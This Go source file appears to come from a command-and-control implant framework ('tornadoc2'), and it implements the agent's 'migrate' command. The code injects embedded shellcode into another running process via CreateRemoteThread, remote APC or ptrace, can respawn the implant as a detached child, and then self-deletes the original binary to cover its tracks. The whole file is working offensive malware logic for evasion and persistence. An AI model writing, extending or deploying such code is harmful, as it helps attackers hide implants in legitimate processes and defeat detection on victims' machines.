package core

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"tornadoc2/agent/platform"
	"tornadoc2/agent/protocol"
)

const migrateReadyEnv = "TORNADO_MIGRATE_READY"

func signalMigrateReady() {
	path := os.Getenv(migrateReadyEnv)
	if path == "" {
		return
	}
	_ = os.Unsetenv(migrateReadyEnv)
	_ = os.WriteFile(path, []byte("ok"), 0600)
}

func (a *Agent) migrateVerb(ctx context.Context,
	t protocol.Task) protocol.Result {

	if len(t.Args) < 1 {
		return protocol.Result{ID: t.ID,
			Error: "migrate requires --self, <pid>, or <name>"}
	}
	target := t.Args[0]

	method, err := parseMigrateMethod(t.Args[1:])
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}

	if target == "--self" || target == "self" {
		if method != "default" {
			return protocol.Result{ID: t.ID,
				Error: "migrate --self does not accept " +
					"--method; the detached-spawn path " +
					"is the only self-migration form. " +
					"Use `execmem --method " + method +
					"` for self-execution."}
		}
		return a.migrateSelf(ctx, t)
	}

	pid, err := resolveTarget(target)
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}

	if InjectorShellcodeB64 == "" {
		return protocol.Result{ID: t.ID,
			Error: "migrate: no injector shellcode embedded at " +
				"build time. Rebuild the agent with " +
				"`inject: true` in the build config " +
				"(Windows: --inject; Linux: \"inject\": true). " +
				"`migrate --self` works without it."}
	}

	injectCtx, cancel := context.WithTimeout(ctx, 120*time.Second)
	defer cancel()

	exitCode, err := injectInto(injectCtx, pid, method)
	if err != nil {
		return protocol.Result{ID: t.ID,
			Error: fmt.Sprintf("inject into pid %d failed: %v",
				pid, err)}
	}

	diag("[beacon] migrate: injected into pid %d "+
		"method=%s exit=%d; self-terminating in 5s\n",
		pid, method, exitCode)

	result := protocol.Result{
		ID: t.ID,
		Output: encodeOutput([]byte(fmt.Sprintf(
			"injected: pid=%d exit=%d\n", pid, exitCode))),
	}
	go func() {
		time.Sleep(5 * time.Second)
		_ = platform.SelfDelete()
		os.Exit(0)
	}()
	return result
}

// parseMigrateMethod extracts --method <name> or --method=<name>
// from the migrate task's trailing arguments.
//
// The default is InjectMethodDefault, which is set at build time
// via -X main.InjectMethodDefault=<name>. Empty or "default"
// selects the platform's historical path — CreateRemoteThread on
// Windows, ptrace on Linux. "apc" selects remote APC injection on
// Windows.
//
// The names "threadpool", "fiber", and "callback" are recognised
// so that an operator who types them gets a clear refusal naming
// the right verb, rather than "unknown method". Fibers and thread
// pools are process-local and do not fit `migrate <pid>`; the
// callback technique requires a per-target implementation and is
// not implemented. Both belong on `execmem` where they can be
// scoped to the current process.
func parseMigrateMethod(args []string) (string, error) {
	method := InjectMethodDefault
	if method == "" {
		method = "default"
	}
	for i := 0; i < len(args); i++ {
		arg := args[i]
		var value string
		switch {
		case arg == "--method":
			if i+1 >= len(args) {
				return "", fmt.Errorf(
					"migrate: --method requires a value")
			}
			value = args[i+1]
			i++
		case strings.HasPrefix(arg, "--method="):
			value = strings.TrimPrefix(arg, "--method=")
		default:
			// Unknown trailing args are tolerated, matching
			// the existing `migrate <pid>` behavior where
			// the verb took exactly one argument.
			continue
		}
		switch value {
		case "default", "apc":
			method = value
		case "threadpool", "fiber":
			return "", fmt.Errorf(
				"migrate: method %q is a self-execution "+
					"technique and is not available on "+
					"`migrate <pid>`. Fibers and thread "+
					"pools are process-local. Use "+
					"`execmem --method %s` instead.",
				value, value)
		case "callback":
			return "", fmt.Errorf(
				"migrate: method \"callback\" is not " +
					"implemented. The callback technique " +
					"requires a hijackable function " +
					"pointer in the target process and a " +
					"per-target implementation. Use " +
					"`--method apc`, or `--method default`.")
		default:
			return "", fmt.Errorf(
				"migrate: unknown method %q; valid values "+
					"are default, apc",
				value)
		}
	}
	return method, nil
}

func resolveTarget(target string) (int, error) {
	if n, err := strconv.Atoi(target); err == nil {
		if n <= 0 {
			return 0, fmt.Errorf("migrate: invalid pid %d", n)
		}
		if !pidExists(n) {
			return 0, fmt.Errorf("migrate: pid %d not running", n)
		}
		return n, nil
	}
	pid, err := findProcessByName(target)
	if err != nil {
		return 0, err
	}
	return pid, nil
}

func (a *Agent) migrateSelf(ctx context.Context,
	t protocol.Task) protocol.Result {

	exePath, err := os.Executable()
	if err != nil {
		return protocol.Result{ID: t.ID,
			Error: "cannot locate own executable: " + err.Error()}
	}
	if strings.Contains(exePath, " (deleted)") {
		return protocol.Result{ID: t.ID,
			Error: "migrate --self: current binary is memory-only"}
	}
	if _, err := os.Stat(exePath); err != nil {
		return protocol.Result{ID: t.ID,
			Error: fmt.Sprintf(
				"migrate --self: cannot read %s: %v",
				exePath, err)}
	}

	readyPath := filepath.Join(os.TempDir(),
		fmt.Sprintf(".t2-migrate-%d-%d.ready",
			os.Getpid(), time.Now().UnixNano()))

	childPID, err := spawnDetached(exePath, readyPath)
	if err != nil {
		return protocol.Result{ID: t.ID,
			Error: "migrate --self: spawn failed: " + err.Error()}
	}
	ready := waitForReady(readyPath, 30*time.Second)
	_ = os.Remove(readyPath)
	if !ready {
		return protocol.Result{ID: t.ID,
			Error: fmt.Sprintf(
				"migrate --self: child pid %d did not signal "+
					"ready; parent left running", childPID)}
	}

	result := protocol.Result{
		ID: t.ID,
		Output: encodeOutput([]byte(fmt.Sprintf(
			"migrated: child=%d target=self\n", childPID))),
	}
	go func() {
		time.Sleep(500 * time.Millisecond)
		_ = platform.SelfDelete()
		os.Exit(0)
	}()
	return result
}

func waitForReady(path string, timeout time.Duration) bool {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if _, err := os.Stat(path); err == nil {
			return true
		}
		time.Sleep(100 * time.Millisecond)
	}
	return false
}

func pidExists(pid int) bool {
	switch runtime.GOOS {
	case "linux":
		_, err := os.Stat(fmt.Sprintf("/proc/%d", pid))
		return err == nil
	case "windows":
		_, err := os.FindProcess(pid)
		return err == nil
	default:
		return true
	}
}